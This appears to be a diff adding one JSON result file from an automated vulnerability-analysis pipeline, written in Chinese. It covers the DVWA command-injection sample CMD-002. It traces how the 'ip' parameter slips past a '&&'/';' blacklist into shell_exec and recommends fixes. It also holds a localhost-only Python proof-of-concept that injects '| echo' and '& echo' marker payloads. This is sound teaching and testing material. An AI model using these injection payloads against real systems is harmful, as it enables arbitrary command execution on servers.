@@ -1,0 +1,176 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "CMD-002",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["CMD-002"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "第4行输入直接取自 $_REQUEST['ip']，第11行黑名单仅替换 '&&' 与 ';'，第13-19行把未加引号、未转义的输入拼进 shell_exec 命令串，第22行把命令 stdout 放进 <pre> 输出，输入、处理、危险操作、输出观察点四处静态证据完整，故为 high。剩余不确定性为部署环境（shell_exec 是否启用、ping 是否存在、认证方式），已列入 preconditions 与 missing_context，不影响该静态路径成立。"
+  },
+  "findings": [
+    {
+      "finding_id": "CMD-002-CMDI-01",
+      "vulnerability_type": "命令注入",
+      "locations": [
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "if( isset( $_POST[ 'Submit' ]  ) ) {"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "$target = $_REQUEST[ 'ip' ];"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$substitutions = array("
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "'&&' => '',"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "';'  => '',"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 11,
+          "line_end": 11,
+          "quote": "$target = str_replace( array_keys( $substitutions ), $substitutions, $target );"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "if( stristr( php_uname( 's' ), 'Windows NT' ) ) {"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$cmd = shell_exec( 'ping  ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 19,
+          "line_end": 19,
+          "quote": "$cmd = shell_exec( 'ping  -c 4 ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-002",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "$html .= \"<pre>{$cmd}</pre>\";"
+        }
+      ],
+      "data_flow": [
+        "入口：第2行以 $_POST['Submit'] 是否存在作为触发条件，片段内无 token、无 CSRF 校验。",
+        "取值：第4行 $target = $_REQUEST['ip']，ip 参数直接进入局部变量，未做类型、格式或长度校验；使用 $_REQUEST 意味着 GET/COOKIE 也能提供该值。",
+        "过滤：第6-9行只定义 '&&' 与 ';' 两个替换项，第11行 str_replace 一次删除这两个子串；未处理 |、||、&、换行、反引号、$() 等 shell 元字符，也未使用 escapeshellarg。",
+        "危险操作：第13行按 php_uname('s') 是否含 'Windows NT' 分支；Windows 分支第15行执行 shell_exec( 'ping  ' . $target )，*nix 分支第19行执行 shell_exec( 'ping  -c 4 ' . $target )，$target 未加引号直接拼接，由 shell 重新解释。",
+        "输出：第22行把命令 stdout 放入 \"<pre>{$cmd}</pre>\"，外层处理器再把 $html 插入 page['body'] 并 dvwaHtmlEcho，<pre> 区域即业务结果观察点。",
+        "跨阶段关联：本父样本仅收到 CMD-002 一个包；片段内 $target 只由第4行 $_REQUEST['ip'] 赋值并在同一作用域内拼接，未经过数据库字段、会话赋值或函数调用，因此按代码内数据流关联，不假设其他包同名变量等价。"
+      ],
+      "principle": "第11行的黑名单只删除 '&&' 与 ';'，属于不完整的有序字符串替换：删除 '&&' 后单个 '&' 仍然保留，'|'、'||'、换行、反引号、$() 完全未处理。第15/19行把未经引号包裹、未经 escapeshellarg 处理的 $target 直接拼接到 shell 命令字符串后交给 shell_exec，shell 会解释其中的管道与命令分隔符，于是 ping 之外附加的命令被执行，其 stdout 又经第22行回显。固定部分 'ping'、' -c 4 ' 本身不产生注入，问题在拼接边界。",
+      "impact": "在满足前置条件的本地教学靶场中，能够提交该表单的主体可在 Web 服务器进程权限下执行任意系统命令，并把命令 stdout 显示在页面 <pre> 区域，导致主机信息泄露、文件读写或进一步横向操作。范围外影响与真实可利用性取决于部署环境，未实测。",
+      "preconditions": [
+        "请求以 POST 提交且包含 Submit 参数（第2行）。",
+        "外层处理器已建立有效登录会话（片段未给出认证开关，需补证）。",
+        "PHP 配置未在 disable_functions 中禁用 shell_exec，且 allow_url_fopen 等无关；关键是 shell_exec 可调用。",
+        "目标系统存在 ping 命令；分支由第13行 php_uname('s') 是否含 'Windows NT' 决定。",
+        "输入的 ip 参数可由请求方控制，且仅经过第11行不完整黑名单。"
+      ],
+      "counterexamples": [
+        "若部署的 php.ini 在 disable_functions 中禁用 shell_exec，第15/19行调用失败，命令不会执行；这是环境性阻断，不是代码层防护。",
+        "若本片段之前的外层代码或前置 WAF 对 ip 做严格 IPv4 白名单（如 filter_var 且拒绝任何元字符），并在到达第4行前拒绝，则可阻断该路径；片段内未见此防护，需补证外层源码。",
+        "若目标系统无 ping 可执行文件或 shell 不可用，命令无法产生输出；属环境状态，不能据此判定代码安全。",
+        "固定命令与固定参数（ping、-c 4、两个空格）本身不构成注入；仅凭 shell_exec 函数名不能成立，成立依据是第11行过滤不足加第15/19行未转义拼接。",
+        "第11行确实会移除 '&&' 与 ';'，因此以 '&&' 或 ';' 直接连接命令的载荷会被破坏；这不能排除 '|'、'&'、'||' 等未列入黑名单的分隔符。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python 3（标准库，无第三方依赖）",
+        "code": "#!/usr/bin/env python3\n\"\"\"CMD-002 command-injection verification draft (localhost lab only).\"\"\"\nimport argparse\nimport http.cookiejar\nimport json\nimport re\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nLINUX_PAYLOAD = '127.0.0.1 | echo {marker}'\nWINDOWS_PAYLOAD = '127.0.0.1 & echo {marker}'\n\n\ndef check_local(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in ('http', 'https'):\n        raise SystemExit('URL scheme must be http or https')\n    if (parts.hostname or '').lower() not in ('localhost', '127.0.0.1', '::1'):\n        raise SystemExit('target host must be localhost, 127.0.0.1 or ::1')\n    return url\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef build_opener(cookie_path):\n    jar = http.cookiejar.MozillaCookieJar()\n    jar.load(cookie_path, ignore_discard=True, ignore_expires=True)\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef request(opener, url, data, timeout):\n    body = urllib.parse.urlencode(data).encode('utf-8') if data is not None else None\n    req = urllib.request.Request(url, data=body, method='POST' if body else 'GET')\n    if body:\n        req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return resp.status, resp.read().decode('utf-8', 'replace')\n    except urllib.error.HTTPError as exc:\n        return exc.code, exc.read().decode('utf-8', 'replace')\n\n\ndef pre_regions(html):\n    return re.findall(r'<pre>(.*?)</pre>', html, flags=re.S | re.I)\n\n\ndef page_token(html, name):\n    pattern = r'name=[\"]%s[\"][^>]*value=[\"]([^\"]+)[\"]'\n    match = re.search(pattern % re.escape(name), html)\n    if match:\n        return match.group(1)\n    pattern = r'value=[\"]([^\"]+)[\"][^>]*name=[\"]%s[\"]'\n    match = re.search(pattern % re.escape(name), html)\n    return match.group(1) if match else None\n\n\ndef submit(opener, url, form, token_name, timeout):\n    data = dict(form)\n    if token_name:\n        status, html = request(opener, url, None, timeout)\n        token = page_token(html, token_name)\n        if not token:\n            print('TOKEN_NOT_FOUND status=%s' % status)\n            return None, None\n        data[token_name] = token\n    return request(opener, url, data, timeout)\n\n\ndef marker_lines(regions, marker):\n    hits = []\n    for region in regions:\n        for line in region.splitlines():\n            if marker in line:\n                hits.append(line.strip())\n    return hits\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='CMD-002 shell command injection check')\n    parser.add_argument('--url', default='http://127.0.0.1/dvwa/vulnerabilities/exec/')\n    parser.add_argument('--cookie', required=True, help='Netscape cookie file for an authenticated session')\n    parser.add_argument('--target-ip', default='127.0.0.1')\n    parser.add_argument('--os', choices=('linux', 'windows'), default='linux')\n    parser.add_argument('--marker', default='CMD002_MARKER')\n    parser.add_argument('--token-name', default=None, help='only if the deployed page form really carries a token')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n    check_local(args.url)\n    payload = (LINUX_PAYLOAD if args.os == 'linux' else WINDOWS_PAYLOAD).format(marker=args.marker)\n    try:\n        opener = build_opener(args.cookie)\n    except OSError as exc:\n        print('COOKIE_LOAD_ERROR %s' % exc)\n        return 3\n    try:\n        base_status, base_html = submit(opener, args.url, {'Submit': 'Submit', 'ip': args.target_ip}, args.token_name, args.timeout)\n        inj_status, inj_html = submit(opener, args.url, {'Submit': 'Submit', 'ip': payload}, args.token_name, args.timeout)\n    except (urllib.error.URLError, OSError) as exc:\n        print('CONNECTION_ERROR %s' % exc)\n        return 2\n    if base_status is None or inj_status is None:\n        return 4\n    base_pres = pre_regions(base_html)\n    inj_pres = pre_regions(inj_html)\n    result = {\n        'url': args.url,\n        'os': args.os,\n        'payload': payload,\n        'baseline_status': base_status,\n        'payload_status': inj_status,\n        'baseline_pre_regions': len(base_pres),\n        'payload_pre_regions': len(inj_pres),\n        'baseline_marker_lines': marker_lines(base_pres, args.marker),\n        'payload_marker_lines': marker_lines(inj_pres, args.marker),\n        'payload_has_ping_stats': any(('bytes from' in r) or ('Reply from' in r) for r in inj_pres),\n        'redirects_followed': False,\n    }\n    print(json.dumps(result, ensure_ascii=False, indent=2))\n    if result['payload_marker_lines'] and not result['baseline_marker_lines']:\n        print('OBSERVED_MARKER_IN_COMMAND_OUTPUT')\n        return 0\n    print('NO_MARKER_OBSERVED')\n    return 1\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，只用标准库：argparse、http.cookiejar、json、re、sys、urllib。",
+          "本地靶场已启动且可从执行机访问（127.0.0.1/localhost）。",
+          "本地 Netscape 格式 cookie 文件，内含已登录会话。"
+        ],
+        "parameters": [
+          "--url：默认 http://127.0.0.1/dvwa/vulnerabilities/exec/，该路径为部署推测，须按实际安装修改；脚本强制只允许 localhost/127.0.0.1/::1。",
+          "--cookie：cookie 文件路径，由测试人员本地提供，不写入仓库；认证前置失败时不得把结果当作过滤或编码生效。",
+          "--target-ip：基线请求的正常目标，默认 127.0.0.1。",
+          "--os linux：载荷 '127.0.0.1 | echo {marker}'，因为第11行未过滤 '|'。",
+          "--os windows：载荷 '127.0.0.1 & echo {marker}'，因为第11行会删除 '&&'，故用单个 '&'。",
+          "--marker：无害回显标记，默认 CMD002_MARKER，仅用于区分 echo 输出与 ping 输出。",
+          "--token-name：可选；代码片段未出现 token 字段，仅当实际页面表单存在 token 时填写，脚本会在同一会话内先 GET 最新页面再取值提交。",
+          "POST 字段：Submit=Submit 与 ip=<payload>，参数名来自第2行与第4行。"
+        ],
+        "steps": [
+          "1. 准备本地靶场与专用测试会话，在浏览器或本地脚本登录后导出 Netscape 格式 cookie 到仓库外文件；记录源提交、PHP 版本、OS、shell_exec 配置。",
+          "2. 先运行基线：python3 cmd002_check.py --cookie cookies.txt --os linux，确认 <pre> 区域出现 ping 统计行，说明会话、路径与 ping 调用链正常。",
+          "3. 再运行注入草案：python3 cmd002_check.py --cookie cookies.txt --os linux --marker CMD002_MARKER；Windows 分支改用 --os windows。",
+          "4. 读取脚本 JSON 输出：payload_marker_lines 应为一行含 CMD002_MARKER 的 echo 输出，baseline_marker_lines 应为空；payload_has_ping_stats 用于确认请求仍走 ping 路径。",
+          "5. 反射对照：以 --marker 换一个新随机标记，并额外提交 ip=<新标记>（不含元字符）一次，确认 <pre> 区域不会仅因参数值出现在响应中而命中标记。",
+          "6. 过滤对照：提交 ip=127.0.0.1 ; echo <新标记>，预期标记不出现（第11行删除 ';'），用于证明标记来自 shell 解释而非直接回显。",
+          "7. 若返回 NO_MARKER_OBSERVED，先核对 disable_functions 是否禁用 shell_exec、ping 是否存在、会话是否失效、URL 是否正确，再人工适配；不得据此直接判为样本安全。"
+        ],
+        "expected_observation": "在 POST 响应的 <pre>...</pre> 区域中出现一行由 echo 子命令产生的标记 CMD002_MARKER（Linux 载荷 127.0.0.1 | echo CMD002_MARKER，Windows 载荷 127.0.0.1 & echo CMD002_MARKER），而基线请求 ip=127.0.0.1 的同一区域只有 ping 统计行、不含该标记；标记必须位于 <pre> 命令输出区域内，而不是页面其他位置的回显或请求参数反射。",
+        "success_criteria": "1) 明确解析目标结果区域：用正则提取响应中由第22行 \"<pre>{$cmd}</pre>\" 生成的 <pre>...</pre> 内容，只在该区域按行匹配标记，不以 HTTP 状态码、响应长度或哈希代替。2) 注入请求的 <pre> 区域出现独立一行标记 CMD002_MARKER，且基线请求 <pre> 区域无标记，两者形成对照。3) 正常 ping 输出（含 'bytes from' 或 'Reply from'）在同一注入响应中仍出现或被管道覆盖，用于确认请求确实到达第15/19行的 ping 调用路径而非页面错误。4) 反射对照：ip=CMD002_MARKER（无元字符的非法主机）时 <pre> 区域不应出现标记行，因为代码只输出 shell_exec 的 stdout，ping 的 stderr 不进入 <pre>；若此时标记仍出现在 <pre>，说明观察点或回显假设有误，必须重新核对而不能升级为确认。5) 黑名单对照：ip=127.0.0.1 ; echo CMD002_MARKER 预期不出现标记行，证明标记来自命令解释而非直接回显；该对照失败时不得判定漏洞成立。6) 只有同时满足区域、标记、基线与反射对照，才记为观察到命令解释；脚本退出码 0 本身不构成漏洞证据。",
+        "limitations": [
+          "本次未运行：execution_status=未运行，父对象 runtime_evidence 为空；以上为草案，需工作包4在本地靶场执行并保存原始脚本、命令、环境、响应与截图。",
+          "URL 路径、登录方式与表单呈现不在片段内，默认 /dvwa/vulnerabilities/exec/ 属部署假设，必须按实际安装调整；套用其他路径不成立。",
+          "代码片段未出现 token 字段，--token-name 仅为通用适配；若部署确实使用 token，必须同会话内每次请求前重新获取最新 token，token 缺失或被拒绝属于前置条件失败。",
+          "未验证 shell_exec 是否被 disable_functions 禁用、ping 是否存在、PHP 版本、Web 服务器权限与 OS 分支；这些是环境前置条件，其失败不能写成过滤生效或样本安全。",
+          "Windows 载荷使用单个 '&'，因为第11行会删除 '&&'；若部署层另有过滤或 cmd 行为差异，需在运行记录中注明为环境限制。",
+          "脚本对 cookie 文件格式敏感；会话过期会表现为登录页或 302，脚本不跟随重定向并会记录状态码，需人工重新获取会话后重跑。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "外层请求处理器与 dvwaPage.inc.php 的实际代码（如何包含本片段、$html 如何插入 page['body']、dvwaHtmlEcho 的实现）。",
+    "登录会话与认证配置：是否需要登录、DVWA security level、是否存在 token 及 token 校验位置。",
+    "PHP 版本、php.ini 中 disable_functions/shell_exec 配置、Web 服务器运行用户与权限。",
+    "部署操作系统及 ping 可执行文件是否可用；第13行分支的实际走向。",
+    "实际部署 URL 路径与表单提交目标，以及 Submit 按钮在页面中的字段名是否与本片段一致。",
+    "外层的 CSRF/token 与输入长度限制（片段未体现）。"
+  ],
+  "risk_notes": [
+    "第22行把 $cmd 原样放入 HTML，若注入命令输出 HTML/JS，可能形成反射型 XSS；超出本次命令注入范围。",
+    "使用 $_REQUEST 读取 ip 使 GET/COOKIE 也能提供该值，扩大入口面；本次按代码实际读取方式记录，不改变命令注入判断。",
+    "片段内未见 CSRF token，命令执行接口可被跨站触发（若会话 cookie 策略允许）；属范围外风险。",
+    "命令执行权限等于 Web 服务器进程权限，实际影响取决于部署账户；未实测，不量化。"
+  ],
+  "quality_notes": [
+    "黑名单过滤不可靠：应改用 IPv4 白名单校验（如 filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)）或对参数使用 escapeshellarg 后再拼接。",
+    "使用 $_REQUEST 而非 $_POST 读取 ip，参数来源不明确。",
+    "str_replace 顺序敏感：先删除 '&&' 反而使单个 '&' 更易作为分隔符；黑名单未覆盖 '|'、'||'、换行、反引号、$()。",
+    "shell_exec 依赖 shell 解释，建议改为参数数组式进程调用（proc_open/exec 配合转义）或固定参数白名单。"
+  ],
+  "limitations": [
+    "仅基于 CMD-002 单个片段做静态分析；外层源码与 context/ 目录未读取，只按输入说明理解调用关系。",
+    "未运行任何请求，runtime_evidence 为空，因此 verdict 只能是待验证，不能声称已确认。",
+    "confidence 表示静态证据完整度，不代表利用成功率或实测结论。",
+    "Windows 与 *nix 两个分支均按代码保留，但未在任一系统实测；环境配置差异的结论需分别说明。",
+    "本仓库原始标签未提供给模型，结论不依赖标签或公开靶场记忆。"
+  ],
+  "runtime_evidence": []
+}
